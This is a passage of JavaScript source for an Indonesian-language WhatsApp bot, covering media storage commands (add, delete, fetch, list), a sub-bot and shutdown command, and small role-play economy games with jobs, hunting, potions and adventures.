Dani.sendMessage(m.chat, { text: `Succes MenambahKan Audio Ketik ${prefix}listaudio untuk melihan audio` }, { quoted: freply })
break
case 'addvideo': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (!isQuotedVideo) return m.reply('Reply Video')
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!text) return m.reply(`Nama Videonya Apa?`)
let videonya = await Dani.downloadMediaMessage(qmsg)
video.push(`${text}`)
fs.writeFileSync(`./storage/video/${q}.mp4`, videonya)
fs.writeFileSync('./storage/video.json', JSON.stringify(video))
Dani.sendMessage(m.chat, { text: `Succes MenambahKan Video Ketik ${prefix}listvideo untuk melihan video` }, { quoted: freply })
break
case 'delsticker':
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!q) return m.reply(`Kirim teks dengan caption ${prefix+command} sticker yang ingin dihapus dari database`)
wanu = stiker.indexOf(q)
if (wanu) return m.reply(`sticker tidak ada didatabase silahkan cek dengan cara ${prefix}liststicker`)
stiker.splice(q, 1)
fs.unlinkSync(`./storage/sticker/${q}.webp`)
m.reply(mess.success)
break
case 'delimage':
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!q) return m.reply(`Kirim teks dengan caption ${prefix+command} image yang ingin dihapus dari database`)
wanu = image.indexOf(q)
if (wanu) return m.reply(`image tidak ada didatabase silahkan cek dengan cara ${prefix}listimage`)
image.splice(q, 1)
fs.unlinkSync(`./storage/image/${q}.jpg`)
m.reply(mess.success)
break
case 'delvideo':
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!q) return m.reply(`Kirim teks dengan caption ${prefix+command}video yang ingin dihapus dari database`)
wanu = image.indexOf(q)
if (wanu) return m.reply(`video tidak ada didatabase silahkan cek dengan cara ${prefix}listvideo`)
video.splice(q, 1)
fs.unlinkSync(`./storage/video/${q}.mp4`)
m.reply(mess.success)
break
case 'delaudio':
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!q) return m.reply(`Kirim teks dengan caption ${prefix+command}audio yang ingin dihapus dari database`)
wanu = image.indexOf(q)
if (wanu) return m.reply(`audio tidak ada didatabase silahkan cek dengan cara ${prefix}listaudio`)
audio.splice(q, 1)
fs.unlinkSync(`./storage/audio/${q}.mp3`)
m.reply(mess.success)
break
case 'getsticker': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!text) return m.reply(`Nama Sticker Apa?`)
try {
ano = fs.readFileSync(`./storage/sticker/${text}.webp`)
Dani.sendImageAsSticker(m.chat, ano, freply, { packname: global.packname, author: global.author })
} catch(err) {
m.reply(`Sticker Tidak Ada`)
}
break
case 'getimage': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!text) return m.reply(`Nama Imagenya Apa?`)
try {
wibu = fs.readFileSync(`./storage/image/${text}.jpg`)
Dani.sendMessage(from, { image: wibu }, { quoted: freply})
} catch(err) {
m.reply(`Image Tidak Ada`)
}
break
case 'getvideo': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!text) return m.reply(`Nama Videonya Apa?`)
try {
wibuu = fs.readFileSync(`./storage/video/${text}.mp4`)
Dani.sendMessage(from, { video: wibuu }, { quoted: freply})
} catch(err) {
m.reply(`Video Tidak Ada`)
}
break
case 'getaudio': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!text) return m.reply(`Nama Audionya Apa?`)
try {
wibuu = fs.readFileSync(`./storage/audio/${text}.mp3`)
Dani.sendMessage(m.chat, { audio: wibuu, mimetype: 'audio/mpeg'}, { quoted: freply })
} catch(err) {
m.reply(`Audio Tidak Ada`)
}
break
case 'changesticker':  
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!isQuotedSticker) return m.reply('Reply stiker')
if (!q) return m.reply(`Nama Sticker Apa?`)
wanu = stiker.indexOf(q)
if (wanu) return m.reply(`sticker tidak ada didatabase silahkan cek dengan cara ${prefix}liststicker`)
delb = await await Dani.downloadMediaMessage(qmsg)
fs.writeFileSync(`./storage/sticker/${q}.webp`, delb)
m.reply(mess.success)
break
case 'changeimage':  
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!isQuotedImage) return m.reply('Reply image')
if (!q) return m.reply(`Nama Imagenya Apa?`)
wanu = image.indexOf(q)
if (wanu) return m.reply(`image tidak ada didatabase silahkan cek dengan cara ${prefix}listimage`)
delb = await await Dani.downloadMediaMessage(qmsg)
fs.writeFileSync(`./storage/image/${q}.jpg`, delb)
m.reply(mess.success)
break
case 'changevideo':  
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!isQuotedVideo) return m.reply('Reply video')
if (!q) return m.reply(`Nama Videonya Apa?`)
wanu = video.indexOf(q)
if (wanu) return m.reply(`video tidak ada didatabase silahkan cek dengan cara ${prefix}listvideo`)
delb = await await Dani.downloadMediaMessage(qmsg)
fs.writeFileSync(`./storage/video/${q}.mp4`, delb)
m.reply(mess.success)
break
case 'changeaudio':  
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!isQuotedAudio) return m.reply('Reply Audio')
if (!q) return m.reply(`Nama Audionya Apa?`)
wanu = audio.indexOf(q)
if (wanu) return m.reply(`audio tidak ada didatabase silahkan cek dengan cara ${prefix}listaudio`)
delb = await await Dani.downloadMediaMessage(qmsg)
fs.writeFileSync(`./storage/audio/${q}.mp3`, delb)
m.reply(mess.success)
break
case 'stickerlist': case 'liststicker':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
teks = '*Sticker List :*\n\n'
for (let awokwkwk of stiker) {
teks += `├❏  ${awokwkwk}\n`
}
teks += `└❏ *Total : ${stiker.length}*\n\n_Untuk mengambil sticker silahkan ketik ${prefix}getsticker caption nama sticker_`
Dani.sendMessage(m.chat, { text: teks }, { quoted: freply })
break
case 'imagelist': case 'listimage':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
teks = '*Image List :*\n\n'
for (let imagelist of image) {
teks += `├❏ ${imagelist}\n`
}
teks += `└❏ *Total : ${image.length}*\n\n_Untuk mengambil image silahkan ketik ${prefix}getimage caption nama image_`
Dani.sendMessage(m.chat, { text: teks }, { quoted: freply })
break
case 'listaudio': case 'audiolist':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
teks = '*List Audio :*\n\n'
for (let awokwkwk of audio) {
teks += `├❏ ${awokwkwk}\n`
}
teks += `└❏ *Total : ${audio.length}*\n\n_Untuk mengambil audio silahkan ketik ${prefix}getaudio caption nama audio_`
Dani.sendMessage(m.chat, { text: teks }, { quoted: freply })
break
case 'videolist': case 'listvideo':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
teks = '*List Video :*\n\n'
for (let awokwkwk of video) {
teks += `├❏ ${awokwkwk}\n`
}
teks += `└❏ *Total : ${video.length}* \n\n_Untuk mengambil video silahkan ketik ${prefix}getvideo caption nama video_`
Dani.sendMessage(m.chat, { text: teks }, { quoted: freply })
break
case 'jadibot': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
jadibot(Dani, m, from)
}
break
case 'listjadibot': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
try {
let user = [... new Set([...global.conns.filter(Dani => Dani.user).map(Dani => Dani.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
y = await Dani.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
Dani.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`Belum Ada User Yang Jadibot`)
}
break
case 'shutdown':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (!isCreator) return sticOwner(from)
m.reply(`Bye...`)
await sleep(3000)
process.exit()
break
case 'daftarkerja': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (args[0] === 'petani'){
db.data.users[m.sender].petani = true
db.data.users[m.sender].ojek = false
db.data.users[m.sender].pedagang = false
db.data.users[m.sender].montir = false
db.data.users[m.sender].dokter = false
db.data.users[m.sender].kuli = false
m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu petani')
} else if (args[0] === 'ojek'){
db.data.users[m.sender].petani = false
db.data.users[m.sender].ojek = true
db.data.users[m.sender].pedagang = false
db.data.users[m.sender].montir = false
db.data.users[m.sender].dokter = false
db.data.users[m.sender].kuli = false
m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu ojek')            
} else if (args[0] === 'pedagang'){
db.data.users[m.sender].petani = false
db.data.users[m.sender].ojek = false
db.data.users[m.sender].pedagang = true
db.data.users[m.sender].montir = false
db.data.users[m.sender].dokter = false
db.data.users[m.sender].kuli = false
m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu pedagang')            
} else if (args[0] === 'montir'){
db.data.users[m.sender].petani = false
db.data.users[m.sender].ojek = false
db.data.users[m.sender].pedagang = false
db.data.users[m.sender].montir = true
db.data.users[m.sender].dokter = false
db.data.users[m.sender].kuli = false
m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu montir')            
} else if (args[0] === 'dokter'){
db.data.users[m.sender].petani = false
db.data.users[m.sender].ojek = false
db.data.users[m.sender].pedagang = false
db.data.users[m.sender].montir = false
db.data.users[m.sender].dokter = true
db.data.users[m.sender].kuli = false
m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu dokter')            
} else if (args[0] === 'kuli'){
db.data.users[m.sender].petani = false
db.data.users[m.sender].ojek = false
db.data.users[m.sender].pedagang = false
db.data.users[m.sender].montir = false
db.data.users[m.sender].dokter = false
db.data.users[m.sender].kuli = true
m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu kuli')            
} else {
let sections = [
{
title: "List Kerja",
rows: [
{title: "PETANI", rowId: `${prefix}daftarkerja petani`, description: ``},
{title: "OJEK", rowId: `${prefix}daftarkerja ojek`, description: ``},
{title: "PEDAGANG", rowId: `${prefix}daftarkerja pedagang`, description: ``},
{title: "MONTIR", rowId: `${prefix}daftarkerja montir`, description: ``},
{title: "DOKTER", rowId: `${prefix}daftarkerja dokter`, description: ``},
{title: "KULI", rowId: `${prefix}daftarkerja kuli`, description: ``}
]
},
]
Dani.sendListMsg(m.chat, `Please select the job!`, Dani.user.name, `Hello Pengangguran !`, `Click Here`, sections, m)
}
}
break            
case 'kerjaan': {
let type = (args[0] || '').toLowerCase()
let users = db.data.users[m.sender]
let time = db.data.users[m.sender].lastjb = 300000
let penumpan = ['mas mas','bapak bapak','cewe sma','bocil epep','emak emak']
let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let daganga = ['wortel','sawi','selada','tomat','seledri','cabai','daging','ikan','ayam']
let dagangan = daganga[Math.floor(Math.random() * daganga.length)]
let pasie = ['sakit kepala','cedera','luka bakar','patah tulang']
let pasien = pasie[Math.floor(Math.random() * pasie.length)]
let pane = ['Wortel','Kubis','stowbery','teh','padi','jeruk','pisang','semangka','durian','rambutan']
let panen = pane[Math.floor(Math.random() * pane.length)]
let bengke = ['mobil','motor','becak','bajai','bus','angkot','becak','sepeda']
let bengkel = bengke[Math.floor(Math.random() * bengke.length)]
let ruma = ['Membangun Rumah','Membangun Gedung','Memperbaiki Rumah','Memperbaiki Gedung','Membangun Fasilitas Umum','Memperbaiki Fasilitas Umum']
let rumah = ruma[Math.floor(Math.random() * ruma.length)]
let pppecat = ['Ruko Kebakaran','LO NGOCOK DIDEPAN UMUM','Males Malesan','Ngew istrinya yg punya ruko']
let alasanpecat = pppecat[Math.floor(Math.random() * pppecat.length)]
let ddppecat = ['Bakar Pasien','Jual Organ Dalem ke Lapak ilegal','serinv telat']
let alasanpasien = ddppecat[Math.floor(Math.random() * ddppecat.length)]
//Uang
let uangm = Math.floor(Math.random() * 10) + 4000
let duit = Math.floor(Math.random() * 20) + 2500
let duitm = Math.floor(Math.random() * 50) + 9500
let duitd = Math.floor(Math.random() * 62) + 5200
let duitr = Math.floor(Math.random() * 20) + 4200
let duitk = Math.floor(Math.random() * 70) + 7800
//ANJAY
let _pecat= `${pickRandom(['1', '1', '1', '1'])}`
let pecat = (_pecat * 1)
let ppecat = `KAMU KENA PECAT KARNA KAMU ${alasanpecat}`
let _dpecat = `${pickRandom(['1', '0', '0', '1'])}`
let dpecat = (_dpecat * 1)
let dppecat = `KAMU DI PECAT KARNA ${alasanpasien}`
//GAK RAPIH G GANTENG
//PEMBATAS\\
let kerjam = `
*🧪 Contoh:*
${prefix+command} ojek

*📝List Kerja:*
🎐Ojek
🎐 Dokter
🎐Petani
🎐 Pedagang
🎐 Montir
🎐 Kuli
*Belum ada Kerja ? ketik ${prefix}daftarkerja
`.trim()
if (/kerjadulu|kerja|work/i.test(command)) {
switch(type) {
case 'ojek':
if (global.db.data.users[m.sender].ojek == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja\nSaatnya istirahat selama ${msToTime(time - new Date())}`
global.db.data.users[m.sender].atm += uangm
global.db.data.users[m.sender].lastkerja = new Date * 1
m.reply(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${uangm} 💹*`)
break
 case 'pedagang':
 if (global.db.data.users[m.sender].pedagang == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 *${msToTime(time - new Date())}*`
global.db.data.users[m.sender].atm += duit
global.db.data.users[m.sender].lastkerja = new Date * 1
m.reply(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${duit} 💹*`)
if (pecat > 1 ) {
global.db.data.users[m.sender].pedagang -= pecat * 1
m.reply(ppecat)
}
break
case 'dokter':
if (global.db.data.users[m.sender].dokter == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 *${msToTime(time - new Date())}*`
global.db.data.users[m.sender].atm += duitm
global.db.data.users[m.sender].lastkerja = new Date * 1
m.reply(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${duitm}* 💹`)
break
case 'petani':
if (global.db.data.users[m.sender].petani == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 *${msToTime(time - new Date())}*`
global.db.data.users[m.sender].atm += uangm
global.db.data.users[m.sender].lastkerja = new Date * 1
m.reply(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${duitd} 💹*`)
break
case 'montir':
if (global.db.data.users[m.sender].montir == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 *${msToTime(time - new Date())}*`
global.db.data.users[m.sender].atm += duitr
global.db.data.users[m.sender].lastkerja = new Date * 1
m.reply(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${duitr}* 💹`)
break
case 'kuli':
if (global.db.data.users[m.sender].kuli == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 *${msToTime(time)}*`
global.db.data.users[m.sender].atm += duitk
global.db.data.users[m.sender].lastkerja = new Date * 1
m.reply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${duitk} 💹*`)
break
default:
return m.reply(kerjam)
}
}
}
break
case 'heal': case 'use': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
let msgerror = (pickRandom(['Error', 'astagfirullah error', 'Nice Error', 'Salah format keknya :v', 'error bro', 'Kocak error :v', 'wtf error :v', 'Ciaaa error', 'error cuyy', 'dahlah (emot batu) error']))
try {
let msgkurang = (pickRandom(['potionmu tidak cukup', 'ciaa gk cukup potionyya :v', 'wtf gk cukup :v', 'beli potion dulu, potionmu gk cukup', 'Duaarr potionmu gk cukup', 'eyyyy potionmu kurang', 'beli dulu lah, masak mau pakai potion tapi gk ada potionnnya :v', 'minta ke orang lain suruh transfer potion, biar potionmu gk kurang :v', 'Beli potion dulu KK']))
let msgpenuh = (pickRandom(['Nyawamu sudah penuh', 'coba deh liat inv mu, nyawamu kan dah 100 ngapai ngunain potion lagi?', 'health mu dah penuh woyy', 'ws kebek weh :v', 'nyawamu dah penuh :v', 'udh weh, udh penuh']))
let kucing = global.db.data.users[m.sender].kucing
let usepotion = (kucing == 0 ? 40 : '' || kucing == 1 ? 45 : '' || kucing == 2 ? 50 : '' || kucing == 3 ? 55 : '' || kucing == 4 ? 60 : '' || kucing == 5 ? 65 : '')
let healt = global.db.data.users[m.sender].healt
if (/use|pakai/i.test(command)) {
try {
let count = (/[0-9]/g.test(args[1])) ? !args[1] || args.length < 2 ? Math.max((Math.ceil((100 - global.db.data.users[m.sender].healt) / usepotion)), 1) : Math.max(args[1], 1) : Math.max((Math.ceil((100 - global.db.data.users[m.sender].healt) / usepotion)), 1)
let msgsucces = (pickRandom(['success memakai', 'Nice succes menggunakan', 'berhasil meminum ', 'primitif anda menggunakan', 'anda memakai', 'Anda menggunakan']) + ' *' + (count * 1) + `* 🥤Potion`)
if (args[0] === 'potion') {
if (global.db.data.users[m.sender].healt < 100) {
if (global.db.data.users[m.sender].potion >= count * 1) {
global.db.data.users[m.sender].potion -= count * 1
global.db.data.users[m.sender].healt += usepotion * count
Dani.send2Button(m.chat, msgsucces, wm, 'inventory', prefix + 'inv', 'petualang', prefix + 'work', m)
} else Dani.send2Button(m.chat, msgkurang, wm, 'beli potion', prefix + 'beli potion', 'cek inv', prefix + 'inv', m)
} else Dani.send2Button(m.chat, msgpenuh, wm, 'inventory', prefix + 'inv', 'petualang', prefix + 'work', m)
} else if (args.length > 2 && args[0] === !'potion') hisoka.send2Button(m.chat, pickRandom(['Hanya bisa menggunakan potion', 'Mau ngunain apa? Cuma bisa gunain potion :v', 'Wih mau gunain apa kamu, kan hanya bisa potion', 'Waduheck, hanya bisa potion', 'lah, mau gunain apa?, kan hanya bisa potion']) + '\nContoh penggunaan: *' + prefix + 'use potion 1*', wm, 'gunakan 1 potion', prefix + 'use potion 1', 'gunakan 2 potion', prefix + 'use potion 2', m)
} catch (e) {
console.log(e)
throw msgerror
}
} else if (/heal/i.test(command)) {
try {
let count = (/[0-9]/g.test(args[0])) ? !args[0] || args.length < 1 ? Math.max((Math.ceil((100 - global.db.data.users[m.sender].healt) / usepotion)), 1) : Math.max(args[0], 1) : Math.max((Math.ceil((100 - global.db.data.users[m.sender].healt) / usepotion)), 1)
let msgsucces = (pickRandom(['success memakai', 'Nice succes menggunakan', 'berhasil meminum ', 'primitif anda menggunakan', 'anda memakai', 'Anda menggunakan']) + ' *' + (count * 1) + `* 🥤Potion`)
if (global.db.data.users[m.sender].healt < 100) {
if (global.db.data.users[m.sender].potion >= count * 1) {
global.db.data.users[m.sender].potion -= count * 1
global.db.data.users[m.sender].healt += usepotion * count
Dani.send2Button(m.chat, msgsucces, wm, 'inventory', prefix + 'inv', 'petualang', prefix + 'work', m)
} else Dani.send2Button(m.chat, msgkurang, wm, 'beli potion', prefix + 'shop buy potion', 'cek inv', prefix + 'inv', m)
} else Dani.send2Button(m.chat, msgpenuh, wm, 'inventory', prefix + 'inv', 'petualang', prefix + 'work', m)
} catch (e) {
console.log(e)
throw msgerror
}
}
} catch (e) {
console.log(e)
throw msgerror
}
}
break
case 'berburu': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
let ___timers = (new Date - global.db.data.users[m.sender].as)
let _timers = (500000 - ___timers)
let timers = clockString(_timers) 
let user = global.db.data.users[m.sender]
if (new Date - global.db.data.users[m.sender].as > 500000) {
let randomaku1 = `${Math.floor(Math.random() * 7)}`
let randomaku2 = `${Math.floor(Math.random() * 7)}`
let randomaku4 = `${Math.floor(Math.random() * 7)}`
let randomaku3 = `${Math.floor(Math.random() * 7)}`
let randomaku5 = `${Math.floor(Math.random() * 7)}`
let randomaku6 = `${Math.floor(Math.random() * 7)}`
let randomaku7 = `${Math.floor(Math.random() * 7)}`
let randomaku8 = `${Math.floor(Math.random() * 7)}`
let randomaku9 = `${Math.floor(Math.random() * 7)}`
let randomaku10 = `${Math.floor(Math.random() * 7)}`
let randomaku11 = `${Math.floor(Math.random() * 7)}`
let randomaku12 = `${Math.floor(Math.random() * 7)}`

let rbrb1 = (randomaku1 * 1)
let rbrb2 = (randomaku2 * 1) 
let rbrb3 = (randomaku3 * 1)
let rbrb4 = (randomaku4 * 1)
let rbrb5 = (randomaku5 * 1)
let rbrb6 = (randomaku6 * 1)
let rbrb7 = (randomaku7 * 1)
let rbrb8 = (randomaku8 * 1)
let rbrb9 = (randomaku9 * 1)
let rbrb10 = (randomaku10 * 1)
let rbrb11 = (randomaku11 * 1)
let rbrb12 = (randomaku12 * 1)

zero1 = `${rbrb1}`
zero2 = `${rbrb2}`
zero3 = `${rbrb3}`
zero4 = `${rbrb4}`
zero5 = `${rbrb5}`
zero6 = `${rbrb6}`
zero7 = `${rbrb7}`
zero8 = `${rbrb8}`
zero9 = `${rbrb9}`
zero10 = `${rbrb10}`
zero11 = `${rbrb11}`
zero12 = `${rbrb12}`

hsl = `*━━━━━━━━━[ Hasil Berburu]━━━━━━━━━*

 *🐂 = [ ${zero1} ]*			*🐃 = [ ${zero7} ]*
 *🐅 = [ ${zero2} ]*			 *🐮 = [ ${zero8} ]*
 *🐘 = [ ${zero3} ]*			 *🐒 = [ ${zero9} ]*
 *🐐 = [ ${zero4} ]*			 *🐗 = [ ${zero10} ]*
 *🐼 = [ ${zero5} ]*			 *🐖 = [ ${zero11} ]*
 *🐊= [ ${zero6} ]*			  *🐓 = [${zero12} ]*

`
global.db.data.users[m.sender].banteng += rbrb1
global.db.data.users[m.sender].harimau += rbrb2
global.db.data.users[m.sender].gajah += rbrb3
global.db.data.users[m.sender].kambing += rbrb4
global.db.data.users[m.sender].panda+= rbrb5
global.db.data.users[m.sender].buaya += rbrb6
global.db.data.users[m.sender].kerbau += rbrb7
global.db.data.users[m.sender].sapi += rbrb8
global.db.data.users[m.sender].monyet += rbrb9
global.db.data.users[m.sender].babihutan += rbrb10
global.db.data.users[m.sender].babi += rbrb11
global.db.data.users[m.sender].ayam += rbrb12

setTimeout(() => {
Dani.sendButton(m.chat, hsl, wm, 'Kandang', '#kandang',m)
 }, 20000) 
   
 setTimeout(() => {
 m.reply(`*DUAR*`)
  }, 18000)

 setTimeout(() => {
 m.reply('KPUMNN !!')
 }, 15000) 

 setTimeout(() => {
 m.reply('DORR DORR !!')
 }, 14000) 
 
 setTimeout(() => {
 m.reply('_Sedang Berburu..._')
 }, 0) 
  user.as = new Date * 1
}
Dani.sendButton(m.chat, `📍 Sepertinya Kakak Sudah Kecapekan\nSilahkan Istirahat dulu Untuk melanjutkan berburu !\n🕖 *${timers}*`, wm, 'Inventory', '.inv',m )
}
break
case 'kandang': { 
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
  let banteng = global.db.data.users[m.sender].banteng
  let harimau = global.db.data.users[m.sender].harimau
 let gajah = global.db.data.users[m.sender].gajah
let kambing = global.db.data.users[m.sender].kambing
let panda = global.db.data.users[m.sender].panda
 let buaya = global.db.data.users[m.sender].buaya
 let kerbau = global.db.data.users[m.sender].kerbau
let sapi = global.db.data.users[m.sender].sapi
 let monyet = global.db.data.users[m.sender].monyet
 let babihutan = global.db.data.users[m.sender].babihutan
 let babi = global.db.data.users[m.sender].babi
 let ayam = global.db.data.users[m.sender].ayam

let zer = `
*—「 KANDANG 🐾 」—*
    
 *◩   ️ 🐂 = [ ${banteng} ] Ekor Banteng*
 *◩   ️ 🐅 = [ ${harimau} ] Ekor Harimau*
 *◩   ️ 🐘 = [ ${gajah} ] Ekor Gajah*
 *◩   ️ 🐐 = [ ${kambing} ] Ekor Kambing*
 *◩   ️ 🐼 = [ ${panda} ] Ekor Panda*
 *◩   ️ 🐊 = [ ${buaya} ] Ekor Buaya*
 *◩   ️ 🐃 = [ ${kerbau} ] Ekor Kerbau*
 *◩   ️ 🐮 = [ ${sapi} ] Ekor Sapi*
 *◩   ️ 🐒 = [ ${monyet} ] Ekor Monyet*
 *◩   ️ 🐗 = [ ${babihutan} ] Ekor Babi Hutan*
 *◩   ️ 🐖 = [ ${babi} ] Ekor Babi*
 *◩   ️ 🐓 = [ ${ayam} ] Ekor Ayam*
 `
Dani.sendButton(m.chat, zer, wm, 'Inventory', '.inv',m )
} 
break
case 'berpetualang': case 'work': case 'mulung': case 'adventure': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
try { 
let __timers = (new Date - global.db.data.users[m.sender].lastadventure)
let _timers = (300000 - __timers) 
let timers = clockString(_timers)
if (global.db.data.users[m.sender].healt > 79) {
if (new Date - global.db.data.users[m.sender].lastadventure > 300000) {
let armor = global.db.data.users[m.sender].armor
let rubah = global.db.data.users[m.sender].rubah
let kuda = global.db.data.users[m.sender].kuda
let kucing = global.db.data.users[m.sender].kucing
let anjing = global.db.data.users[m.sender].anjing
let ____health = `${Math.floor(Math.random() * 101)}`.trim()
let ___health = (____health * 1)
let kucingnya = (kucing == 0? 0 : '' || kucing == 1 ? 5 : '' || kucing == 2 ? 10 : '' || kucing == 3 ? 15 : '' || kucing == 4 ? 21 : ''  || kucing == 5 ? 30 : '')
let armornya = (armor == 0 ? 0 : '' || armor == 1 ? 5 : '' || armor == 2 ? 10 : '' || armor == 3 ? 15 : '' || armor == 4 ? 21 : '' || armor == 5 ? 30 : '')
let __health = (___health > 60 ? ___health - kucingnya - armornya : ___health)
let healt = (kucing == 0 && armor == 0 ? pickRandom(['100', '99', '98', '97', '96', '95', '94', '93', '92', '91', '90']) : kucing > 0 && armor > 0 ? __health : ___health)
let exp = (Math.floor(Math.random() * 400) + (kuda * 70))
let uang = (Math.floor(Math.random() * 400) + (anjing * 70))
let _potion = `${Math.floor(Math.random() * 2)}`.trim()
let potion = (_potion * 1)
let _diamond = (rubah == 0 ? pickRandom(['0', '1', '0', '1', '0', '1', '0']) : '' || rubah == 1 ? pickRandom(['0', '1', '0', '1']) : '' || rubah == 2 ? pickRandom(['0', '1', '0', '1', '2']) : '' || rubah == 3 ? pickRandom(['0', '1', '0', '2', '2', '0']) : '' || rubah == 4 ? pickRandom(['0', '1', '1', '2', '1', '1', '0']) : '' || rubah == 5 ? pickRandom(['0', '0', '1', '2', '2', '1', '1', '0']) : '' )
let diamond = (_diamond * 1)
let _common = `${Math.floor(Math.random() * 3)}`.trim()
let common = (_common * 1)
let _uncommon = `${Math.floor(Math.random() * 2)}`.trim()
let uncommon = (_uncommon * 1) 
let _mythic = `${pickRandom(['1', '0', '0', '1'])}`
let mythic = (_mythic * 1)
let _legendary = `${pickRandom(['1', '0', '0', '0'])}`
let sampah = `${Math.floor(Math.random() * 300)}`.trim()
let legendary = (_legendary * 1)
let _kayu = `${Math.floor(Math.random() * 3)}`.trim()
let kayu = (_kayu * 1)
let _batu = `${Math.floor(Math.random() * 2)}`.trim()
let batu = (_batu * 1)
let _string = `${Math.floor(Math.random() * 2)}`.trim()
let string = (_string * 1)
let _iron = `${Math.floor(Math.random() * 2)}`.trim()
let iron = (_iron * 1)
let str = `
❤️ Nyawa mu berkurang -${healt * 1} karena Kamu telah berpetualang sampai ${pickRandom(['🇯🇵 Jepang', '🇰🇷 Korea', '🇮🇳 India', '🇺🇲 Amerika', '🇵🇸 Palestin', '🇮🇶 Iraq', '🇸🇦 Arab', '🇵🇰 Pakistan', '🇩🇪 German', '🇫🇮 Finlandia', 'Ke bawa dunia mimpi 😱', 'Ujung dunia 🌏', 'Mars 👽', 'Bulan 🌚', 'Pluto 😱', 'Matahari 🌞', 'Hatinya dia ♥️', '...'])} dan mendapatkan
🧬 *exp:* ${exp} 
💵 *uang:* ${uang}
🗑️ *sampah:* ${sampah}${potion == 0 ? '' : `\n*🥤Potion:* ` + potion + ''}${iron == 0 ? '' : `\n*⛓️Iron:* ` + iron + ''}${kayu == 0 ? '' : `\n*🪵Kayu:* ` + kayu + ''}${batu == 0 ? '' : `\n*🪨Batu:* ` + batu + ''}${string == 0 ? '' : `\n*🕸️String:* ` + string + ''}${diamond == 0 ? '' : `\n*💎diamond:* ` + diamond + ''}${common == 0 ? '' : `\n*📦common crate:* ` + common + ''}${uncommon == 0 ? '' : `\n*🛍️uncommon crate:* ` + uncommon + ''}
`.trim()
m.reply(await str.trim())
if (mythic > 0) {
       global.db.data.users[m.sender].mythic += mythic * 1
       m.reply('*Selamat anda mendapatkan item Rare yaitu*\n' + mythic + `🎁Mythic Crate`)
}
if (legendary > 0) {
    global.db.data.users[m.sender].legendary += legendary * 1
    m.reply('*Selamat anda mendapatkan item Epic yaitu*\n' + legendary + `🎁Legendary Crate`)
}
